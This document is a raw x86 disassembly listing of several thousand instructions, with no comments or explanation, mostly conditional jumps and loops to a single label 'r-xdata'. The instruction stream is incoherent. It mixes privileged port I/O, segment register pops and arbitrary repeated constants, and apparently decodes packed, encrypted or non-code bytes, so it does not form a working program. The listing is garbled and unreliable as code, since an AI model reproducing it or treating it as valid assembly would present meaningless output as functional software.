imul eax ecx 0xb
jb r-xdata
mov ah dh
jecxz r-xdata
pop edx
or esi [ ecx - 0x3f ]
dec esi
call 0x72b88dde
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x3a69eeb5
popad
sbb [ 0x15bb67ed ] ebx
sbb eax 0xb22d11d
inc esp
sbb eax 0xee26611d
mov cl 0x88
loopne r-xdata
mov eax 0x1d3e310b
imul esi [ edi - 0x717747f0 ] 0xffffff84
imul esi [ edi - 0x7bcd96d6 ] 0x6b
mov bh 0x28
mov edi 0x16af6b1e
jb r-xdata
test [ ebx - 0x61 ] ch
sbb cl [ eax + 0x1fe30bb4 ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0xbee2661
jb r-xdata
into
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ebp eax
jb r-xdata
loop r-xdata
jb r-xdata
dec ebp
or dh [ 0xffffffffee8a1d1d ]
jb r-xdata
jb r-xdata
jb r-xdata
mov ch 0xb2
jb r-xdata
or ecx [ edi + 0x721d1d0d ]
jb r-xdata
lahf
jecxz r-xdata
push es
outsd
sbb eax 0x3fe30b1d
jb r-xdata
jb r-xdata
jecxz r-xdata
loop r-xdata
or esp esp
add bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
cmp eax 0x86611d1d
popad
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
or esp edx
jb r-xdata
rcl eax 0x1
loop r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
or bl [ ebx ]
shl edx cl
loop r-xdata
cmpsd [ esi ] [ edi ]
0xe06a0e63 0xe2e2
mov esi 0x72e2e2f6
jb r-xdata
mov ch 0xee
imul edi [ edx ] 0xed1d1961
mov ebx 0xd11d1d15
and cl [ ebx ]
jb r-xdata
retn 0xe2e2
or al [ esi ]
jb r-xdata
out dx al
jb r-xdata
sub bl [ bx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push cs
sbb eax 0x7272721d
in eax dx
jb r-xdata
and [ ebx - 0x4b ] edx
sbb eax 0x4dee8a1d
jb r-xdata
adc dh [ edx + 0x1a340bb5 ]
jb r-xdata
sbb eax 0xe2e26e74
sub esp [ es : ecx ]
jb r-xdata
mov ebp 0xe2f2770b
jb r-xdata
jb r-xdata
jb r-xdata
or bl [ 0x1d1d ]
or edx [ ebx ]
call 0x72b8ae10
jb r-xdata
sub al 0x30
or esp ebx
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
test [ ebx + 0x7272721d ] dh
jb r-xdata
mov ebp 0x549f6b84
jb r-xdata
jb r-xdata
jb r-xdata
cmp [ 0x7272721d ] ebx
xchg dh al
jb r-xdata
jb r-xdata
push ds
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov bh 0x69
push cs
imul esp [ edi + 0x6a0e63ea ] 0xbe2e2e0
or dl [ eax ]
sbb eax 0x7272721d
jb r-xdata
mov cl 0x88
jb r-xdata
stc
jb r-xdata
and eax 0x721d1d1f
jb r-xdata
jb r-xdata
inc edx
pop ds
sbb eax 0x1db5b2b4
arpl bp ax
jb r-xdata
jb r-xdata
jg r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
pop ds
sbb eax 0xab50e97
in ax 0xe2
loop r-xdata
loop r-xdata
arpl bp ax
sbb eax 0xe2e20674
jb r-xdata
movsd [ edi ] [ esi ]
jecxz r-xdata
mov ebx 0xe2f00d0b
cmpsd [ esi ] [ edi ]
sbb cl [ ebx ]
xor ecx [ eax ]
sbb eax 0x7272721d
jb r-xdata
mov ch dh
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x6f
mov ah dl
loop r-xdata
push ds
loope r-xdata
jb r-xdata
jb r-xdata
imul esp [ edi - 0x6e7745f0 ] 0xffffffbc
test [ ebx - 0x59 ] ch
push ss
mov [ esi + 0x2b0b2469 ] bh
ja r-xdata
jb r-xdata
out 0xe2 eax
loop r-xdata
mov ah 0xb4
mov ah 0x6f
sbb eax 0x67ed7272
movsb [ edi ] [ esi ]
xchg edi eax
push ss
or eax [ esp + ebp * 8 ]
sbb eax 0x676fb11d
sub bl [ edi ]
sbb eax 0x676fb21d
push esi
sbb bl [ 0xffffffffb41db21d ]
0x676f
bound ebx [ edi + 0x67ede3f2 ]
sub al 0x30
aas
jb r-xdata
xchg edi eax
0xe66ae468 0xd1db
popad
jb r-xdata
jb r-xdata
jpo r-xdata
shr [ ebx ] 0x1
and ch ch
sbb eax 0x72727272
jb r-xdata
outsb
0x88e2e2e2 0x1de2
dec edx
push edx
jb r-xdata
jb r-xdata
mov [ edi - 0x60947b43 ] dl
pop esi
imul ebx [ ebx + ecx ] 0xe2e2ecb7
imul ebx [ edi - 0x425077ac ] 0xffffff84
imul ebx [ edi - 0x7be796a6 ] 0x6b
lahf
pop eax
arpl [ esi + ebx * 2 - 0x1e ] bx
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov [ edx + 0x14af6b84 ] bl
jb r-xdata
jb r-xdata
mov dh 0xe2
jb r-xdata
sbb [ 0x6bb4bb1d ] ebx
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jecxz r-xdata
sar [ edx ] 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and dh [ ebp + esi * 4 + 0x6b1ea76b ]
jb r-xdata
sbb eax 0x1d0ba291
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x13cb66ed
sbb eax 0x8ae6881d
or edx esi
fsub st2
or edx [ eax ]
call 0x72b88c4c
imul esp [ edi - 0xc81f4ea ] 0x7272e2e2
jb r-xdata
popad
mov [ es : 0xffffffff81821c8a ] al
lgs ebp [ ebx - 0x5c ]
test [ edx ] 0x14
xor eax 0x668a1d1d
cmpsd [ esi ] [ edi ]
or [ edx + 0x1d12ad0b ] bh
sbb eax 0x72727272
jb r-xdata
mov [ edi + 0xaa76b84 ] al
mov edx 0x6b848c88
jb r-xdata
outsd
jb r-xdata
jb r-xdata
outsd
loop r-xdata
mov [ 0xffffffffc6e66bfa ] al
and ch ch
imul esp [ edi + 0x1ea7691a ] 0xffffffd9
cmpsd [ esi ] [ edi ]
sbb ch ch
jpe r-xdata
jb r-xdata
mov ah 0x88
retn 0xb4b4
or esi [ edi - 0xe ]
jb r-xdata
into
sbb eax 0x10560a1d
jb r-xdata
mov dh 0x19
sbb eax 0x1db4b21d
loop r-xdata
jb r-xdata
and bl [ 0x7272721d ]
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb eax 0x36676fb2
pop ds
sbb eax 0x170ab21d
pop ecx
sbb eax 0xf226611d
sub esp [ ecx ]
outsd
out 0xe2 eax
enter 0x1d13 0x1d
jb r-xdata
jb r-xdata
loop r-xdata
std
mov ch ch
jb r-xdata
sbb eax 0x72727272
outsd
imul esp [ edi + 0x72212b1e ] 0x72727272
mov [ edi - 0x60947b43 ] ch
pop edx
imul ebx [ eax ] 0x589f6b84
test [ ebx - 0x61 ] ch
push esp
jb r-xdata
sbb eax 0xed1d671d
jb r-xdata
pushad
in eax dx
jb r-xdata
push ss
imul edi [ edi - 0x7bc396e6 ] 0x6b
mov edi 0xb3a6918
in eax dx
test [ ebx - 0x49 ] ch
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
or eax ecx
jb r-xdata
loop r-xdata
sbb eax 0xa66bb4bb
or edi [ esi + 0x721d1d01 ]
cmpsb [ esi ] [ edi ]
sbb eax 0x6bb4bb1d
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xa725721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb ah bl
push ds
imul esp [ edi + 0x1aa76b16 ] 0xb
jb r-xdata
jge r-xdata
mov ah 0xb5
imul esp [ edi + 0x16a76b1e ] 0x6b
jb r-xdata
mov [ 0xffffffffe2fb1d0b ] al
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x1db1b21d
imul ebp [ edi + 0x6b84bb1a ] 0xffffffaf
jb r-xdata
cmpsd [ esi ] [ edi ]
loop r-xdata
loop r-xdata
jb r-xdata
or eax [ eax + 0x72e2e2d2 ]
jb r-xdata
jb r-xdata
sbb eax 0xe2e26a74
cmpsd [ esi ] [ edi ]
mov dl 0x8a
in al 0xe2
loopne r-xdata
sbb eax 0x990bf2b5
std
loop r-xdata
jb r-xdata
push ebx
loop r-xdata
jb r-xdata
pop ds
sbb eax 0x106a0a1d
push edx
jb r-xdata
popad
fsub st2
or ecx eax
mov ah 0xb4
mov ah 0xb4
mov ah 0xb
jpo r-xdata
loop r-xdata
loop r-xdata
pop ds
jb r-xdata
imul esp esi 0x7221bbc6
jb r-xdata
imul esp esi 0xffffffc6
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0xed22671d
or dl [ esi + 0x10 ]
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
out dx al
imul esp [ edi - 0x794de216 ] 0x1a612bd1
sbb eax 0xb2377ed
jns r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul ebx [ eax ] 0x6b849a88
lahf
push esi
test [ ebx - 0x61 ] ch
push eax
pop esp
or edi eax
sbb eax 0x204a67ed
jb r-xdata
jb r-xdata
loop r-xdata
mov bh 0x82
jb r-xdata
jb r-xdata
adc esi [ eax ]
sbb eax 0x7272721d
mov dl 0x88
jecxz r-xdata
jb r-xdata
adc al 0x69
sub cl [ ebx ]
hlt
scasd [ edi ]
jb r-xdata
cmp bl [ 0xffffffffa725721d ]
jb r-xdata
jb r-xdata
imul esi [ edx ] 0xe2f73e0b
loop r-xdata
mul edx
jb r-xdata
mov esi 0x721d1d01
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add [ 0x7272721d ] ebx
jb r-xdata
jb r-xdata
pop ds
outsd
cmpsd [ esi ] [ edi ]
xor dh [ edx + esi * 4 + 0x1d3edb0a ]
sbb eax 0x7272721d
jb r-xdata
cmpsd [ esi ] [ edi ]
push ss
jb r-xdata
sub bl [ edi ]
sbb eax 0x4e676f1d
adc al 0x1d
sbb eax 0xe2f8960a
loop r-xdata
test [ ebx - 0x61 ] ch
outsd
jb r-xdata
sbb eax 0x72e2e2fb
jb r-xdata
xchg ecx eax
jb r-xdata
jb r-xdata
or ecx [ esi - 0x18 ]
sub [ eax + 0x1d3e310b ] bh
loop r-xdata
out 0x6f al
cmpsd [ esi ] [ edi ]
sub dh [ edx - 0x1d1379f5 ]
loop r-xdata
mov cl 0xb1
jb r-xdata
jb r-xdata
jb r-xdata
sbb [ ebp + ebx + 0x1d ] 0x72727272
jb r-xdata
sbb eax 0x107c0a1d
jb r-xdata
jb r-xdata
mov ah 0xb
sbb eax 0x9f6f721d
pop edx
outsd
outsd
push edx
pop ds
jb r-xdata
lahf
jb r-xdata
or edi ecx
out 0xe2 eax
loop r-xdata
sbb eax 0x1d107c0a
jb r-xdata
sub esp [ ecx ]
test [ ebx - 0x59 ] ch
adc [ edx - 0x7b436e78 ] bh
imul esp [ edi + 0x69be8816 ] 0x24
or ebp [ ebx ]
loop r-xdata
jb r-xdata
adc [ 0xffffffffed22671d ] bl
pop esp
sbb eax 0xd861841d
loop r-xdata
adc eax 0xe60bb51b
sub eax 0x72721d1d
in eax dx
movsb [ di ] [ si ]
jb r-xdata
jb r-xdata
sbb [ 0x1db4b21d ] ebx
sbb eax 0x7272721d
jb r-xdata
push esi
jb r-xdata
jb r-xdata
sbb [ 0x2267bb1d ] ebx
in eax dx
stosd [ di ]
pop ds
sbb eax 0x3420b1d
sbb eax 0x7272721d
test [ ebx - 0x59 ] ch
add al 0xba
or edx [ eax + 0x2d ]
sbb eax 0x66ed721d
0x8a1d1d3a 0xbbcd
pop es
jl r-xdata
mov ah 0xa
cwde
pop ebp
sbb eax 0xee26611d
and [ 0xffffffffed1d671d ] bl
jb r-xdata
in eax dx
and [ 0xfffffffff2a16f1d ] bl
dec edx
jb r-xdata
jb r-xdata
loop r-xdata
mov eax 0x6b848088
jb r-xdata
jb r-xdata
fdivr st7
loop r-xdata
xchg esi eax
xor al 0xe3
imul ebp [ edx ] 0x1d1ff40b
sbb eax 0x72727272
jb r-xdata
sbb eax 0x1ea72572
jb r-xdata
or ah dl
sbb eax 0x751db21d
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
sbb eax 0x69727272
jb r-xdata
jb r-xdata
sbb eax 0x6f6fb21d
push esi
sbb bl [ 0x3b9c0a1d ]
movsw [ edi ] [ esi ]
salc
loop r-xdata
or eax [ ebx + ecx + 0x66ed1d1d ]
and edi [ 0xffffffff86611d1d ]
sub cl [ ebx ]
aam 0xce
loop r-xdata
popad
imul esp [ edi + 0x1f7d0b1a ] 0x1d
sbb eax 0x72727272
jb r-xdata
jb r-xdata
pop ds
jb r-xdata
loop r-xdata
imul ebx [ edi + 0xb1c6912 ] 0x7d
cli
loop r-xdata
jb r-xdata
or ebx [ 0x72e2e2fb ]
jb r-xdata
mov edi 0x72727221
jb r-xdata
and al 0xa7
push cs
or edx ecx
push cs
pop ds
sbb eax 0xe38ab21d
loop r-xdata
sbb eax 0xaf69ee97
0xe2e48f0b 0x72e2
or cl [ eax + 0x6b84bd8f ]
jb r-xdata
test [ ebx - 0x61 ] ch
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x67ed2267
hlt
or bh [ eax + edx + 0x1d ]
jb r-xdata
loop r-xdata
sbb eax 0x67ed2267
jb r-xdata
mov [ 0xffffffff881d1d5a ] ax
jb r-xdata
jb r-xdata
or cl [ esi ]
pop eax
sbb eax 0xee26611d
and ch ch
mov dl 0xb
shr [ ebx ] cl
sbb eax 0x7272721d
jl r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
or esp [ edi - 0x1e ]
sbb eax 0x55edfeb5
movsb [ edi ] [ esi ]
in al 0xb
popfd
sub [ 0x7272721d ] bl
mov dl dl
imul ebp [ edx ] 0x72721d1d
jb r-xdata
sbb eax 0x67ed1d67
jb r-xdata
sbb eax 0xf2a16f1d
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
mov [ ebp - 0x58947b48 ] al
add [ ebx + ebp * 2 - 0x7b477f49 ] 0x6b
mov bh 0x86
jb r-xdata
jb r-xdata
jb r-xdata
and ebp ebp
jb r-xdata
jb r-xdata
or ecx [ ecx - 0x3c ]
scasd [ edi ]
push ss
mov ebx 0x6b849a88
jb r-xdata
or esi esp
jb r-xdata
and eax 0xe2e31ea7
mov dl 0x1d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xab76f72
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
sbb cl [ ebx ]
mov ch dl
or dl [ esi + 0x69e2e2f8 ]
jb r-xdata
sti
jb r-xdata
0xb16971d 0xe4b
jb r-xdata
shl edx 0xe2
jb r-xdata
sbb [ eax ] esi
jb r-xdata
jb r-xdata
lahf
jb r-xdata
or [ eax + 0x6b84bd8a ] cl
lahf
mov ebp 0xa9f6b84
jb r-xdata
jb r-xdata
jb r-xdata
hlt
adc [ 0xffffffffed22671d ] bl
jb r-xdata
and ch ch
jb r-xdata
pop esp
jb r-xdata
sbb eax 0x72727272
jb r-xdata
pop edx
sbb eax 0xba8d881d
jb r-xdata
jb r-xdata
sbb eax 0xed22671d
mov bh 0xb
mov [ 0x721d1d07 ] eax
adc ebx [ 0x7272721d ]
jb r-xdata
sbb esi [ ebp + 0x1d2de60b ]
sbb eax 0x72727272
loop r-xdata
jb r-xdata
push edx
sub ch [ edi + 0x6f ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xb51d0697
sbb eax 0x204a67ed
jb r-xdata
outsd
jb r-xdata
imul esi [ edi + 0x6b84b880 ] 0xffffffb7
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
out 0xc6 al
jb r-xdata
mov dl 0x6f
jb r-xdata
jb r-xdata
mov al al
jb r-xdata
outsd
jb r-xdata
pop ds
sbb eax 0x7272721d
mov ebx 0x66ed2267
xchg al bh
loop r-xdata
mov edx 0x9c0bc788
loop r-xdata
jne r-xdata
jb r-xdata
push ds
dec ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xe2e20274
jb r-xdata
popfd
cmp [ 0xe120b1d ] bl
or bl [ edi + 0x18 ]
outsd
jb r-xdata
arpl [ esi ] cx
sbb eax 0x1a61bb1d
jecxz r-xdata
je r-xdata
sbb eax 0xe2e24e74
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
xchg edi eax
jb r-xdata
loop r-xdata
jb r-xdata
fwait
sahf
sbb eax 0x7272721d
jb r-xdata
test [ ebx - 0x61 ] ch
jb r-xdata
mov [ edi - 0x60947b43 ] cl
jb r-xdata
imul ebx [ edi - 0x427077f6 ] 0xffffff84
imul ebx [ edi + 0x6b84bd00 ] 0xffffff9f
jb r-xdata
jb r-xdata
outsd
jb r-xdata
or esp [ ebx + 0x721d1d07 ]
jb r-xdata
jb r-xdata
test [ ebx - 0x5c ] ch
sbb eax 0xb2bb5a1d
jb r-xdata
sbb eax 0xbba8d88
sbb al [ ebx + 0x7272721d ]
jb r-xdata
jb r-xdata
imul esp [ edi + 0x1ea7691e ] 0xffffffe1
cmpsd [ esi ] [ edi ]
loop r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmp [ 0x7272721d ] bl
or edi eax
jb r-xdata
mov al ah
outsd
scasd [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0xbc0bfa97
in al dx
loop r-xdata
jb r-xdata
mov cl 0xb
adc al 0xc1
loop r-xdata
jb r-xdata
imul esp esi 0x7221bbc6
jb r-xdata
jmp edx
mov bl ah
or ebx eax
loop r-xdata
or esi [ ebx ]
loop r-xdata
sbb [ 0x751db21d ] ebx
mov dl 0x6f
and dh [ edx - 0x27f41c78 ]
cmp al 0xb
push esi
shl [ edx ] 0x1
mov [ 0xffffffffe2f8bc0b ] al
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
xor cl [ ebx ]
mul edx
shl al cl
loop r-xdata
push cs
sbb eax 0x1ec10a1d
mov bh 0xea
outsd
sub bl [ bx ]
jb r-xdata
mov ah 0xb
xor al 0xc2
mov [ ebx + ecx + 0x1d1d10a7 ] dl
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
or cl [ edx ]
jb r-xdata
mov cl 0xb4
pop esp
into
loop r-xdata
loop r-xdata
mov edi 0x721d1d3b
jb r-xdata
adc ch [ ecx + 0x1c ]
or edi [ ebp - 0x6 ]
lahf
mov ebx 0x67ed2267
mov ah 0x3d
jb r-xdata
or ecx [ ebx + 0xe ]
jb r-xdata
jb r-xdata
jb r-xdata
or dh [ edx + 0xb1d1d36 ]
or esi [ ebx ]
or bl [ 0xffffffffb172721d ]
loop r-xdata
jb r-xdata
jb r-xdata
lahf
or dh cl
push cs
mov [ ebp + 0x1d18d60b ] al
sbb eax 0x72727272
jb r-xdata
mov ebp 0x89f6b84
mov [ edx - 0x60947b43 ] cl
jb r-xdata
jb r-xdata
or ebx [ ecx ]
jb r-xdata
add [ ebp + 0xa9f6b84 ] bh
jb r-xdata
jb r-xdata
mul [ es : edi + 0x22 ]
jb r-xdata
pop edx
jb r-xdata
pop sp
jb r-xdata
lea edi [ edx + 0x1d041a0b ]
jb r-xdata
sbb eax 0x25000b1d
lahf
jb r-xdata
jb r-xdata
into
jb r-xdata
sbb eax 0xed22671d
mov bx 0x1d32
sbb eax 0x130b22d1
nop [ 0x72727272 ] ebx
jb r-xdata
or ch [ edx + 0x10 ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
clc
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov [ esi + 0x10af6b84 ] dl
mov ebx 0x6b84cc88
sbb eax 0xe2e24675
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and bh [ ebx + ecx - 0x1d1d104c ]
jb r-xdata
jb r-xdata
mov dl 0x6f
jb r-xdata
mov bh 0xa
cmpsd [ esi ] [ edi ]
push ds
jb r-xdata
sbb eax 0xa751db2
jb r-xdata
popad
jb r-xdata
mov esp 0xe2efb40b
loop r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
xchg esi eax
test [ ebx - 0x51 ] ch
adc [ ebx + 0x6b84cc88 ] bh
pop edi
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x1d5bd90a
jb r-xdata
jb r-xdata
mov dl 0x36
sbb eax 0x30190b1d
test [ ebx - 0x49 ] ch
pop esp
mov eax 0x6b848d88
mov bh 0x22
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x6f
imul ebx [ edi - 0x427577f8 ] 0xffffff84
imul ebx [ edi + 0xb85880e ] 0xffffffd6
jb r-xdata
xor [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
and ch ch
jb r-xdata
jb r-xdata
loop r-xdata
mov dl 0xe2
jb r-xdata
pop esp
jb r-xdata
or ebx [ edx ]
jb r-xdata
mov ah 0xa
fldcw [ eax ]
loop r-xdata
outsd
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x2472721d
cmpsd [ esi ] [ edi ]
sbb eax 0xe7ce0ae2
loop r-xdata
mov dl 0xb5
or esi [ edx + ebx ]
imul esp edx 0x6bfaa269
out 0xc6 al
je r-xdata
sbb eax 0xbf2a16f
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
outsd
jb r-xdata
xchg edi eax
movsb [ edi ] [ esi ]
salc
or esp [ esi - 0x11 ]
loop r-xdata
sbb eax 0x104c0a72
sbb eax 0x2267bb1d
jb r-xdata
jb r-xdata
mov al [ 0x45f7be6a ]
popad
sbb al 0xc2
jb r-xdata
sbb eax 0xf60b67ed
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
adc [ 0x7272721d ] bl
sbb eax 0xa70b9488
xchg esi eax
outsd
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul ebp [ edi + 0x160f0bee ] 0x6f721d1d
jb r-xdata
sbb eax 0xe2e20a75
jb r-xdata
jb r-xdata
sbb eax 0xe2e26274
loop r-xdata
0xf7be6aa0 0x6145
jb r-xdata
loop r-xdata
jb r-xdata
mov ah 0xef
loop r-xdata
sbb eax 0x7272721d
or bl [ ebp + 0xb1d1d38 ]
sbb eax 0xb94881d
jb r-xdata
cmp [ ebx + ecx + 0x1d1d07b0 ] esi
jb r-xdata
jb r-xdata
and ch ch
mov ah 0x3d
out 0xe3 al
loop r-xdata
loop r-xdata
jb r-xdata
push 0xd1e2e2ec
loop r-xdata
sbb eax 0x1dee2661
jne r-xdata
fstp [ ebx + 0x1d ]
mov ch 0x6b
movsb [ edi ] [ esi ]
0x1d36e50a 0x8a1d
jb r-xdata
and cl [ ebx ]
mov eax 0x721d1d59
fldcw [ ecx ]
jb r-xdata
or edi [ eax + 0x721d1d59 ]
or bl [ esi + 0x61e2e2e1 ]
jb r-xdata
lahf
jb r-xdata
out 0x66 eax
loop r-xdata
cmp [ 0xffffffffc6a6691d ] ebx
sbb eax 0xe266e7d2
loop r-xdata
int1
sbb eax 0x72727272
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
and eax 0xe28813a7
mov dl ah
and eax 0xe28817a7
xor edi [ esi ]
jb r-xdata
loop r-xdata
or ebp [ edx ]
jb r-xdata
imul esp [ edx + ebp * 8 + 0xbf2a769 ] 0xffffff9d
loope r-xdata
loop r-xdata
jb r-xdata
sbb eax 0xe2b2bb5a
jb r-xdata
add al 0x1d
jb r-xdata
or eax [ ecx + 0x721d1d5c ]
xor [ edi ] 0x646b1d1d
push esi
loop r-xdata
mov ah 0xb4
or edi [ ebx + 0x11 ]
outsd
jb r-xdata
loop r-xdata
mov eax [ 0x38f80bf2 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edx [ ebx ]
loop r-xdata
jb r-xdata
and ah dl
jb r-xdata
out 0xc6 al
arpl [ esi ] cx
dec esi
out 0xe2 al
loop r-xdata
jb r-xdata
imul ecx [ esi ] 0x8ae688b5
or esi [ edi + ebp * 8 + 0x7272e2e2 ]
jb r-xdata
sbb [ 0x751db21d ] ebx
or eax ebp
or ah dl
mov dh 0x19
and al 0xea
mov esi 0x1c6145f7
retn 0x60ed
in eax dx
pushad
or edi [ edi ]
mul dl
loop r-xdata
or ecx [ eax - 0x14 ]
cmpsd [ esi ] [ edi ]
push ds
loope r-xdata
jb r-xdata
mov esi 0xb21d1d1f
rcl [ esp + esi * 4 ] 0x1
sbb eax 0x6e0baeb5
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
out dx al
or ecx [ edi ]
push ss
jb r-xdata
jb r-xdata
in eax dx
sbb eax 0xa721d1d
jb r-xdata
loop r-xdata
sbb ah [ edi + 0x1d ]
in eax dx
or esi esi
push edx
push 0xffffffbe
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
shl dl 0x1
loop r-xdata
outsd
sbb eax 0x7272721d
jb r-xdata
imul ebp [ edi + 0xb808818 ] 0x6c
push ds
movsb [ edi ] [ esi ]
salc
mov dl 0xb
pop edx
cld
loop r-xdata
mov dh ah
jb r-xdata
adc esp [ esi + 0x30 ]
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov [ esi + 0xb8688ba ] bh
stosb [ edi ]
out 0xe2 eax
loop r-xdata
push ds
loop r-xdata
in eax dx
jne r-xdata
jb r-xdata
loope r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
outsd
in al dx
fwait
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
in al 0xe2
jb r-xdata
jb r-xdata
mov ebx 0x84e2e2b2
jb r-xdata
sbb eax 0xe6a46b1d
or dl [ esi - 0x75e2e2c9 ]
and [ ebp + 0x45 ] 0xd4
mov ch 0x6b
push edx
loop r-xdata
imul ebx [ esi + 0xab4f6c6 ] 0xffffffd9
imul esp [ esi + 0x1d37960a ] 0x1d
mov al [ edx - 0x4a2bba9b ]
imul esp [ edx + edx * 2 - 0x1e ] 0xffffffe2
or ch [ edi + 0x6f ]
jb r-xdata
mov ah 0xf6
or edx [ ecx + edx + 0xb721d1d ]
xor eax 0xffffffe2
loop r-xdata
loop r-xdata
jb r-xdata
pop edx
jb r-xdata
jb r-xdata
or edi [ edi + 0x72e2e2f4 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
adc esi edx
loop r-xdata
outsd
loop r-xdata
jb r-xdata
add [ 0x1ea71d1d ] ebx
mov ch 0xb
add eax [ 0x676f1d1d ]
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
loop r-xdata
sbb eax 0xb1ea71d
dec eax
jb r-xdata
into
outsb
or ebx esp
xor bl [ ebx - 0x629e8de3 ]
retn 0xbe3
mov [ 0xffffffffc6e66bfa ] al
jb r-xdata
loop r-xdata
and ah dl
jb r-xdata
jb r-xdata
jb r-xdata
movhps xmm3 [ 0xffffffffb76f721d ]
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebp + 0x61 ] 0x60edc21c
fldenv [ esi + edx * 8 - 0x1d1099f5 ]
loop r-xdata
loop r-xdata
or ebp [ esi - 0x32 ]
loop r-xdata
jb r-xdata
or esp [ edi + 0x721d1d10 ]
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
push ds
sar [ ecx ] 0x1
test [ ebx - 0x41 ] ch
sbb al 0xb
lodsb [ esi ]
shl edx 0x1
loop r-xdata
outsd
imul esp [ edi + 0x16971dea ] 0x1d0e4b0b
sbb eax 0x72727272
jb r-xdata
xor ch ch
jb r-xdata
jb r-xdata
jb r-xdata
and esp eax
mov ch 0x69
sbb [ ecx + 0x18 ] ah
iretd
or al 0x29
sbb eax 0x7272721d
popad
xor al [ ebx + ebp * 2 - 0x7747a749 ]
xchg [ ebx + ebp * 2 - 0x7747a149 ] al
add [ ebx + ebp * 2 - 0x7747a349 ] 0x8d
test [ ebx - 0x49 ] ch
sbb eax 0x7272721d
fstp [ ecx ]
in eax dx
cmpsd [ esi ] [ edi ]
adc cl [ eax + 0xb216990 ]
and [ esi ] bl
loop r-xdata
or cl bl
push es
sbb eax 0xed21d91d
push 0xe2ec
jne r-xdata
jb r-xdata
sub [ 0x25000b1d ] bl
or bl cl
outsd
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
fldenv [ ecx ]
in eax dx
jb r-xdata
0xbf2a769 0xe19d
jb r-xdata
loop r-xdata
jb r-xdata
outsd
jb r-xdata
jb r-xdata
